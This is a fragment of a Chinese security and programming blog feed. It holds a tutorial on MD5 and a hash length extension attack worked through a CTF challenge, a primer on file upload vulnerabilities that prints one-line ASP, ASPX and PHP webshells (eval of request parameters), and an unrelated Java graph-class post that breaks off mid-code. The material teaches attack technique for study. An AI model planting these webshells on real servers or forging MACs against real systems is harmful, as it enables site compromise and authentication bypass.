class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>a，b，c，d是缓冲区的当前值</li><li>g是4个轮函数之一，输入输出都是<code>32bit</code>，进行不同的逻辑运算</li><li><code>&lt;&lt;&lt;s</code>（CLS（s））是指把<code>bit32</code>循环左移<code>s</code>位，<code>s</code>可查表得到</li><li><code>X[k]</code>是当前处理消息分组的第<code>k</code>个<code>32bit</code>（一共512/32=16个字），在每一轮循环中都由不同的公式计算出来</li><li><code>T[i]</code>通过查表得到，32bit字</li><li>所有的加法都是模$2^32$加法</li></ul><p>4个轮函数逻辑如图所示：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2011.05.00.png" alt="4个轮函数" style="zoom:50%;"><p>每轮循环中<code>X[k]</code>所取的<code>k</code>的计算方法为：</p><p>取<code>j</code>为当前迭代轮次</p><ol><li>第一轮循环：<code>k = j</code></li><li>第二轮循环：<code>k = (1 + 5 * j) % 16</code></li><li>第三轮循环：<code>k = (5 + 3 * j) % 16</code></li><li>第四轮循环：<code>k = (7 * j) % 16</code></li></ol><h3 id="1-2-5-更新寄存器"><a href="#1-2-5-更新寄存器" class="headerlink" title="1.2.5 更新寄存器"></a>1.2.5 更新寄存器</h3><p>根据每轮的计算结果更新寄存器A、B、C、D的值。</p><h3 id="1-3-6-生成哈希值"><a href="#1-3-6-生成哈希值" class="headerlink" title="1.3.6 生成哈希值"></a>1.3.6 生成哈希值</h3><p>最后一轮得到的结果经过高低位互换后就是最终的结果。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">6f8db599de986fab7a21625b7916589c<span class="token assign-left variable">A</span><span class="token operator">=</span>0x99b58d6f<span class="token assign-left variable">B</span><span class="token operator">=</span>0xab6f98de<span class="token assign-left variable">C</span><span class="token operator">=</span>0x5b62217a<span class="token assign-left variable">D</span><span class="token operator">=</span>0x9c581679<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>A B C D 分别按字节反转后拼接构成最后的哈希值。</p><h1 id="二、哈希长度扩展攻击原理"><a href="#二、哈希长度扩展攻击原理" class="headerlink" title="二、哈希长度扩展攻击原理"></a>二、哈希长度扩展攻击原理</h1><h2 id="2-1-攻击场景"><a href="#2-1-攻击场景" class="headerlink" title="2.1 攻击场景"></a>2.1 攻击场景</h2><h3 id="2-1-1-攻击场景1-文件下载权限验证"><a href="#2-1-1-攻击场景1-文件下载权限验证" class="headerlink" title="2.1.1 攻击场景1-文件下载权限验证"></a>2.1.1 攻击场景1-文件下载权限验证</h3><p>Message Authentication Codes (MACs)是用于验证信息真实性的算法。最简单的MAC算法是这样的：服务器把key和message连接到一起，然后用摘要算法如<code>MD5</code>或<code>SHA1</code>取出摘要。</p><p>例如有一个网站，在用户下载文件之前需验证下载权限。</p><p>这个网站会用如下的算法产生一个关于文件名的MAC：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">def Create_MAC<span class="token punctuation">(</span>key, filename<span class="token punctuation">)</span>   <span class="token builtin class-name">return</span> Digest::MD5.hexdigest<span class="token punctuation">(</span>key + filename<span class="token punctuation">)</span>end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>key对于攻击者来说是未知的。</p><p>用户请求下载test.pdf文件时提交如下请求：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/download?file<span class="token operator">=</span>test.pdf<span class="token operator">&amp;</span><span class="token assign-left variable">mac</span><span class="token operator">=</span>ca21cf672b66a5ee6fa7fc7c1c314ff3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当用户发起请求要下载一个文件时，会执行下面这个函数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">def verify_mac<span class="token punctuation">(</span>key, filename, userMAC<span class="token punctuation">)</span>    validMAC <span class="token operator">=</span> create_MAC<span class="token punctuation">(</span>key, filename<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>validMAC <span class="token operator">==</span> userMAC<span class="token punctuation">)</span> <span class="token keyword">do</span>        initiateDownload<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span>        displayError<span class="token punctuation">(</span><span class="token punctuation">)</span>    endend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务端根据key和用户提交的文件名生成一个哈希值，跟用户提交的哈希值做比对，比对成功才会允许下载文件，这种情况下要求文件名和用户提供的mac值都是合法的。</p><p>本意是通过key的保密性来验证身份，因为正常情况下只有服务端和合法客户端才掌握key。</p><p>这样，只有当用户没有擅自更改文件名时服务器才会执行<code>initiateDownload()</code>开始下载。</p><p>但是这种生成MAC的方式，会给攻击者在文件名后添加自定义的字符串留下隐患。 </p><p>这种方法就是哈希长度拓展攻击。</p><p>攻击结果：不知道key、不知道合法文件名，但是能通过验证。</p><h3 id="2-1-2-攻击场景2"><a href="#2-1-2-攻击场景2" class="headerlink" title="2.1.2 攻击场景2"></a>2.1.2 攻击场景2</h3><p>在一道web题目中遇到了以下判断: <code>if ($COOKIE["md5hash"] === md5($secret . $input))</code></p><p>在该题目中我们可以掌握的参数有<code>md5hash</code>、<code>input</code>的值，<code>secret</code>的md5值和长度，我们需要想办法让这个判断通过。</p><p>难点在于：不知道$secret的情况下，传递一个哈希值和input，使得哈希值===md5($secret.$input)。</p><h2 id="2-2-哈希长度扩展攻击简介"><a href="#2-2-哈希长度扩展攻击简介" class="headerlink" title="2.2 哈希长度扩展攻击简介"></a>2.2 哈希长度扩展攻击简介</h2><p>哈希长度扩展攻击（Hash Length Extension Attacks）是一种针对某些加密散列函数的攻击手段，特别适用于那些基于Merkle–Damgård结构的算法，如MD5和SHA-1。这类攻击的核心在于，如果你知道一个消息（message）和密钥（key）的组合的哈希值，即使不知道密钥的具体值，只要知道密钥的长度，你就能在这个消息后面添加额外的信息，并计算出新的哈希值。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5<span class="token punctuation">(</span>xxxxx+<span class="token string">"plainText"</span><span class="token punctuation">)</span><span class="token operator">=</span>cdf1ea<span class="token punctuation">..</span>md5<span class="token punctuation">(</span>xxxxx+<span class="token string">"plainText"</span>+<span class="token string">"abcdfafa"</span><span class="token punctuation">)</span><span class="token operator">=</span>ade24242<span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>攻击条件：</p><ol><li>﻿﻿消息可控已知</li><li>﻿﻿密钥长度已知</li><li>﻿﻿﻿使用MD5加密且结果可知</li></ol><h2 id="2-3-攻击步骤"><a href="#2-3-攻击步骤" class="headerlink" title="2.3 攻击步骤"></a>2.3 攻击步骤</h2><h3 id="2-3-1-以某CTF赛题为例子"><a href="#2-3-1-以某CTF赛题为例子" class="headerlink" title="2.3.1 以某CTF赛题为例子"></a>2.3.1 以某CTF赛题为例子</h3><ul><li>代码如下：</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2014.21.21.png" alt="CTF赛题实例" style="zoom:50%;"><h3 id="2-3-2-条件分析"><a href="#2-3-2-条件分析" class="headerlink" title="2.3.2 条件分析"></a>2.3.2 条件分析</h3><p>从代码中已知<code>$this-&gt;sess=md5($this-&gt;token.$this-&gt;username)</code>，在不传递任何参数的情况下，<code>$sess</code>为token（20个未知字符）与”admin”组成的字符串的md5值，并且会在cookie中返回。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sess</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>从上面的代码可知，$sess和$username的值是用户提交的。</p><p>获取flag的条件是：提交一个伪造的非”admin”的username，并且提交该username与token拼接之后的md5值（也就是$sess），但是由于toekn不为我们所知晓，我们也无从计算出正确的md5值。</p><p>我们目前掌握的信息：</p><p>1）????????????????????admin 的哈希值 （?表示的内容为未知token），记为H1。</p><p>2）未知token的长度为20。</p><p>3）username和sess的值是可控的。</p><h3 id="2-3-3-核心要点"><a href="#2-3-3-核心要点" class="headerlink" title="2.3.3 核心要点"></a>2.3.3 核心要点</h3><p>巧妙利用md5哈希算法的分组运算机制。</p><p>将H1当作某个明文（这个明文我们需要伪造）中的第一个数据块（512bit）的散列值。根据md5算法以每512bit为数据块计算散列值的原理，当计算第二个数据块的散列值时，会以H1作为ABCD寄存器的缓存值。</p><p>我们如果能把字符串扩展到512bit以上，并保证第一段的md5运算结果不改变，那么我们在不知道第一段的加密内容的情况下仍然能够求得整体的md5值。此所谓”扩展”的含义。</p><h3 id="2-3-4-攻击实施"><a href="#2-3-4-攻击实施" class="headerlink" title="2.3.4 攻击实施"></a>2.3.4 攻击实施</h3><h4 id="1）模仿md5算法的填充"><a href="#1）模仿md5算法的填充" class="headerlink" title="1）模仿md5算法的填充"></a>1）模仿md5算法的填充</h4><p>所以我们首先要做的就是”模仿”md5算法的补位方式来进行补位。</p><p>????????????????????admin的长度=20+5=25个byte25*8=200bit</p><p>表示成16进制即为：0xC8=12*16+8=200</p><p>所以填充的结果如下（称为M1）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">【????????????????????admin】【8000000<span class="token punctuation">..</span><span class="token punctuation">..</span>000000】【c800000000000000】<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>【（????????????????????admin）】为消息内容。</p><p>【8000000….000000】为填充值。</p><p>【c800000000000000】为长度填充。</p><p>如此一来，M1经过md5算法计算的结果，跟md5（????????????????????admin）计算的结果是一致的。我们知识作了md5算法本身就该做的事情。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5<span class="token punctuation">(</span>M1<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span>md5<span class="token punctuation">(</span>????????????????????admin<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如前文所述，实际上在本实例中上述值我们是知道的，eg:ae8b63d93b14eadd1adb347c9e26595a（H1）</p><h4 id="2）将已知的H1值作为作为ABCD寄存器的缓存值"><a href="#2）将已知的H1值作为作为ABCD寄存器的缓存值" class="headerlink" title="2）将已知的H1值作为作为ABCD寄存器的缓存值"></a>2）将已知的H1值作为作为ABCD寄存器的缓存值</h4><p>将<code>ae8b63d93b14eadd1adb347c9e26595a</code>分成8字节唯一组的四组，ae8b63d9,3b14eadd,1adb347c,9e26595a</p><p>由于md5是小端存储，进行相应的调整：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">A</span><span class="token operator">=</span>0xd9638bae<span class="token assign-left variable">B</span><span class="token operator">=</span>0xddea143b<span class="token assign-left variable">C</span><span class="token operator">=</span>0x7c34db1a<span class="token assign-left variable">D</span><span class="token operator">=</span>0x5a59269e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3）拼接第二段内容"><a href="#3）拼接第二段内容" class="headerlink" title="3）拼接第二段内容"></a>3）拼接第二段内容</h4><p>M1+fakeadmin</p><p>将我们求出来的ABCD序列作为初始序列，利用md5算法对<code>fakeadmin</code>这个字符串进行md5加密。得到md5值：</p><p>比如是：bdbe1c6fb9d921e4ba3d9d4072b702f7（H2）</p><p>这个H2===md5(M1+fakeadmin)</p><h3 id="2-3-5-修改cookie获取flag"><a href="#2-3-5-修改cookie获取flag" class="headerlink" title="2.3.5 修改cookie获取flag"></a>2.3.5 修改cookie获取flag</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">username</span><span class="token operator">=</span>M1+fakeadmin<span class="token assign-left variable">session</span><span class="token operator">=</span>bdbe1c6fb9d921e4ba3d9d4072b702f7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="三、攻击工具"><a href="#三、攻击工具" class="headerlink" title="三、攻击工具"></a>三、攻击工具</h1><p><a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a> 【hash_extender】</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-d</span> 被扩展的明文<span class="token parameter variable">-a</span> 附加的到原来hash的padding<span class="token parameter variable">-l</span> 盐的长度<span class="token parameter variable">-f</span> 加密方式<span class="token parameter variable">-s</span> 带盐加密的hash值--out-data-format 输出格式<span class="token parameter variable">--quiet</span> 仅输出必要的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        </p>]]></content>
      
      
      <categories>
          
          <category> 密码学算法安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学算法安全 </tag>
            
            <tag> 哈希长度扩展攻击 </tag>
            
            <tag> md5哈希长度扩展攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞基础</title>
      <link href="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/"/>
      <url>/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>网站提供文件上传功能，但是对用户上传的内容过滤不严格，导致用户上传任意文件甚至恶意文件， 包括恶意脚本文件、exe程序等——&gt;文件上传漏洞。</p><h1 id="二、漏洞成因"><a href="#二、漏洞成因" class="headerlink" title="二、漏洞成因"></a>二、漏洞成因</h1><ul><li>1、服务器配置不当</li><li>2、开放了文件上传功能，但是对上传的内容没有做限制</li><li>3、限制不严格导致被绕过</li></ul><h1 id="三、漏洞危害"><a href="#三、漏洞危害" class="headerlink" title="三、漏洞危害"></a>三、漏洞危害</h1><ul><li><p>任意文件上传：恶意脚本、程序等。</p></li><li><p>上传的可写目录也具有可执行权限，上传webshell导致网站沦陷。</p></li><li><p>通过其他漏洞提权，导致服务器沦陷，波及旁站。</p></li></ul><h1 id="四、webshell"><a href="#四、webshell" class="headerlink" title="四、webshell"></a>四、webshell</h1><h2 id="4-1-概念"><a href="#4-1-概念" class="headerlink" title="4.1 概念"></a>4.1 概念</h2><p>通过上传漏洞获得的网站后门，webshell也是一个命令解释器，继承web用户权限。本质上是一个可以在服务端运行的脚本文件。</p><h2 id="4-2-大马"><a href="#4-2-大马" class="headerlink" title="4.2 大马"></a>4.2 大马</h2><p>代码复杂，功能强大：文件管理、执行系统命令</p><p>⚠️：密码一般写在文件中</p><h2 id="4-3-小马"><a href="#4-3-小马" class="headerlink" title="4.3 小马"></a>4.3 小马</h2><h3 id="4-3-1-一句话木马"><a href="#4-3-1-一句话木马" class="headerlink" title="4.3.1 一句话木马"></a>4.3.1 一句话木马</h3><ul><li>asp</li></ul><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%eval&nbsp;request("x")%&gt;&nbsp;&lt;%execute&nbsp;request("x")%&gt;&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>aspx（ASP.NET）</li></ul><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%@&nbsp;Page&nbsp;Language="Jscript"%&gt;&lt;%eval(Request.Item["x"],"unsafe");%&gt;&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;%@ Page Language="Jscript"%&gt;：这行代码是一个指令，告诉ASP.NET页面，页面中的脚本应该使用JScript（也就是微软的JavaScript实现）来编写。这允许你在ASP.NET页面中使用JavaScript代码。&lt;%eval(Request.Item["x"],"unsafe");%&gt;：&lt;% ... %&gt;：这是ASP.NET中执行服务器端代码的语法。eval：这是一个JavaScript函数，它接受一个字符串参数，并尝试执行这个字符串作为代码。这是一个非常危险的函数，因为它可以执行任何JavaScript代码，包括恶意代码。Request.Item["x"]：这行代码从HTTP请求中获取名为"x"的项的值。这通常是一个查询字符串参数，例如在URL中 ?x=someValue。"unsafe"：这是eval函数的一个参数，指定了代码执行的上下文。在这种情况下，它允许代码在全局上下文中执行，这意味着它可以访问和修改全局变量。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>【asp VS aspx】</p><pre class="line-numbers language-none"><code class="language-none">ASP（Active Server Pages）和ASP.NET（通常以文件扩展名.aspx表示）是微软开发的两种不同的服务器端脚本技术，用于创建动态网页。它们之间存在一些关键的区别：一、技术基础：ASP：基于VBScript或JavaScript，是一种较老的技术，运行在IIS（Internet Information Services）服务器上。ASP.NET：是.NET Framework的一部分，支持多种语言（如C#、VB.NET等），提供了更强大的功能和性能。二、执行模式：ASP：解释执行，每次请求页面时，服务器都会解释执行ASP代码。ASP.NET：编译执行，.aspx页面在第一次请求时被编译成中间语言（IL），然后由.NET运行时环境执行，这提供了更好的性能。三、开发环境：ASP：开发环境相对简单，通常使用文本编辑器和IIS。ASP.NET：提供了集成开发环境（IDE），如Visual Studio，支持代码提示、调试和其他高级功能。四、状态管理：ASP：状态管理较为有限，通常依赖于Cookies或隐藏表单字段。ASP.NET：提供了更丰富的状态管理选项，如ViewState、Session State、Cache等。五、安全性：ASP：安全性较低，容易受到脚本注入等攻击。ASP.NET：提供了更高级的安全特性，如输入验证、成员资格和角色管理。六、跨平台性：ASP：主要运行在Windows服务器上。ASP.NET：虽然主要也是在Windows上运行，但随着.NET Core的发展，ASP.NET Core已经支持跨平台运行。总的来说，ASP.NET是ASP的后继者，提供了更现代、更强大的Web开发功能。随着技术的发展，ASP.NET已经演进到ASP.NET Core，这是一个更轻量级、高性能、跨平台的框架。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token prolog">&lt;?php @eval($_REQUEST['cmd’]);?&gt;</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>jsp</li><li>jspx</li></ul><p>jSP和jspx的一句话木马比较复杂一些。</p><p>【jsp vs jspx】</p><pre class="line-numbers language-none"><code class="language-none">JSP（JavaServer Pages）和 JSPX 是 Java Web 开发中用于创建动态网页的技术。它们允许开发者在 HTML 页面中嵌入 Java 代码。以下是 JSP 和 JSPX 的主要区别：1、文件扩展名：JSP：文件通常以 .jsp 作为扩展名。JSPX：文件以 .jspx 作为扩展名。2、XML基础：JSP：不是基于 XML 的，这意味着在 JSP 文件中，HTML 标签不需要关闭，可以自由地混合 HTML 和 Java 代码。JSPX：基于 XML 的，要求页面必须符合 XML 的格式，所有的 HTML 标签都需要正确关闭，以确保文件在 XML 格式上是有效的。3、脚本元素：JSP：使用 &lt;% %&gt; 来嵌入 Java 代码，使用 &lt;%! %&gt; 来声明类级别的变量和方法，使用 &lt;%= %&gt; 来输出表达式的结果。JSPX：使用 &lt;jsp:scriptlet&gt; 来嵌入 Java 代码，使用 &lt;jsp:declaration&gt; 来声明方法，输出表达式的结果通常使用 JSPX 的标准动作 &lt;jsp:expression&gt;。4、标准动作和标签库：JSP：可以使用 JSP 标准标签库（JSTL）来增加功能，但需要手动添加标签库的指令。JSPX：天然支持 JSP 标准标签库，不需要额外的指令就可以使用 JSTL。5、配置和部署：JSP：在 web.xml 中配置 servlet 映射。JSPX：通常不需要在 web.xml 中进行额外的配置，因为它们是作为 JSP 的扩展。6、开发工具支持：JSP：大多数 Java IDE 和文本编辑器都支持 JSP 开发。JSPX：可能需要更高级的 IDE 支持，因为它是基于 XML 的。7、性能：JSP：在性能上可能略有优势，因为它们不需要遵循 XML 的严格格式。JSPX：由于 XML 的解析可能稍微慢一些，但这种差异通常可以忽略不计。8、可读性和维护性：JSPX：由于其 XML 基础，可以提供更好的可读性和维护性，特别是对于大型项目。在实际开发中，选择 JSP 还是 JSPX 通常取决于项目需求、团队偏好以及开发工具的支持。JSPX 提供了更严格的结构，有助于保持代码的整洁和一致性，而 JSP 则提供了更多的灵活性。随着 JavaServer Faces (JSF) 框架的流行，JSPX 也变得更加流行，因为 JSF 页面默认使用 .jspx 扩展名。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">在Java Web开发中，如果后端文件以JSP或JSPX结尾，这通常意味着该Web系统可能是基于以下框架开发的：1、JavaServer Pages (JSP)：JSP是一种服务器端技术，允许开发者在HTML页面中嵌入Java代码。JSP文件通常用于生成动态Web内容。如果一个Web系统的后端文件以.jsp结尾，这可能表明它是一个传统的JSP应用。2、JavaServer Faces (JSF)：JSF是一个基于组件的Web应用框架，它使用JSPX文件作为其视图技术。JSPX文件是JSP的XML兼容版本，它们提供了更严格的格式，并且与JSF的组件模型紧密集成。如果后端文件以.jspx结尾，这可能意味着该系统使用了JSF框架。3、Spring MVC：虽然Spring MVC通常与Thymeleaf或Freemarker模板引擎一起使用，但它也可以与JSP或JSPX文件一起工作。在Spring MVC应用中，控制器会处理HTTP请求并返回一个视图名称，这个视图名称可以映射到一个JSP或JSPX页面。4、Struts：Struts是一个MVC框架，它也支持使用JSP和JSPX文件作为其视图层。在Struts应用中，JSP和JSPX文件用于展示数据和处理用户输入。5、其他Java EE技术：除了上述框架，还有其他Java EE技术可能使用JSP和JSPX文件，如EJB（Enterprise JavaBeans）。   需要注意的是，JSP和JSPX文件可以与多种Java Web框架一起使用，它们本身并不局限于特定的框架。开发者可以根据自己的需求和偏好选择合适的框架和技术栈。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-3-2-配合菜刀、蚁剑使用"><a href="#4-3-2-配合菜刀、蚁剑使用" class="headerlink" title="4.3.2 配合菜刀、蚁剑使用"></a>4.3.2 配合菜刀、蚁剑使用</h3><p>文件管理<br>        虚拟终端<br>        数据库管理：此时需要知道连接数据库的账密</p><h2 id="4-4-getshell"><a href="#4-4-getshell" class="headerlink" title="4.4 getshell"></a>4.4 getshell</h2><p>获取webshell的的过程和结果</p><p>主要方式：借助文件上传漏洞。</p><h1 id="五、文件上传漏洞的基础利用和防御绕过"><a href="#五、文件上传漏洞的基础利用和防御绕过" class="headerlink" title="五、文件上传漏洞的基础利用和防御绕过"></a>五、文件上传漏洞的基础利用和防御绕过</h1><h2 id="5-1-利用条件"><a href="#5-1-利用条件" class="headerlink" title="5.1 利用条件"></a>5.1 利用条件</h2><ul><li>有可访问的文件上传功能</li></ul><p>任意文件上传漏洞，首先要有能上传文件的的地方，即——要有文件上传点。有一些网站虽然貌似没有上传点，但是其实存在上传代码的。虽然没有明确使用上传功能 ，但使用了上传有关的函数，这种情况需要通过代码审计去看。</p><p>最常见的就是上传头像。</p><ul><li><p>写权限+执行权限</p></li><li><p>Web容器可以解析webshell</p></li><li><p>能访问得到上传的文件：如果访问不到，则无法对文件进行控制，也就没有漏洞的说法</p></li><li><p>无视以上条件配置不当：有PUT方法（只要有PUT方法必有文件上传漏洞）</p></li></ul><h2 id="5-2-利用-HTTP-PUT方法上传文件"><a href="#5-2-利用-HTTP-PUT方法上传文件" class="headerlink" title="5.2 利用 HTTP PUT方法上传文件"></a>5.2 利用 HTTP PUT方法上传文件</h2><h3 id="5-2-1-Apache-如何开启-PUT方法"><a href="#5-2-1-Apache-如何开启-PUT方法" class="headerlink" title="5.2.1 Apache 如何开启 PUT方法"></a>5.2.1 Apache 如何开启 PUT方法</h3><h3 id="5-2-2-PUT方法的上传漏洞"><a href="#5-2-2-PUT方法的上传漏洞" class="headerlink" title="5.2.2 PUT方法的上传漏洞"></a>5.2.2 PUT方法的上传漏洞</h3><h2 id="5-3-防御绕过和利用"><a href="#5-3-防御绕过和利用" class="headerlink" title="5.3 防御绕过和利用"></a>5.3 防御绕过和利用</h2><h2 id="5-4-00截断"><a href="#5-4-00截断" class="headerlink" title="5.4 00截断"></a>5.4 00截断</h2>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> 基础知识库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图-图的通用结构表达的建立</title>
      <link href="/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/"/>
      <url>/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/</url>
      
        <content type="html"><![CDATA[<h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1.引言"></a>1.引言</h1><p>  图的表达方法千千万，平时选一个自己最喜欢的结构，把所有算法都在这个结构上玩通，以后遇到陌生的图结构表达，转化为自己喜欢的那个结构，然后用自己实现的算法即可。重点就是实现一个接口将陌生的图表达数据结构转化为自己熟悉的图结构表达。</p><h1 id="2-Node类"><a href="#2-Node类" class="headerlink" title="2.Node类"></a>2.Node类</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span><span class="token comment">//节点值</span><span class="token keyword">public</span> <span class="token keyword">int</span> in<span class="token punctuation">;</span><span class="token comment">//入度</span><span class="token keyword">public</span> <span class="token keyword">int</span> out<span class="token punctuation">;</span><span class="token comment">//出度</span><span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">&gt;</span></span> nexts<span class="token punctuation">;</span><span class="token comment">//下行的邻居节点</span><span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">&gt;</span></span> edges<span class="token punctuation">;</span><span class="token comment">//下行边</span><span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token operator">=</span>value<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>in<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>out<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>nexts<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>edges<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-Edge类"><a href="#3-Edge类" class="headerlink" title="3.Edge类"></a>3.Edge类</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Edge</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">int</span> weight<span class="token punctuation">;</span><span class="token comment">//边权</span><span class="token keyword">public</span> <span class="token class-name">Node</span> from<span class="token punctuation">;</span><span class="token comment">//始边</span><span class="token keyword">public</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">;</span><span class="token comment">//终边</span><span class="token keyword">public</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token keyword">int</span> weight<span class="token punctuation">,</span><span class="token class-name">Node</span> from<span class="token punctuation">,</span><span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token 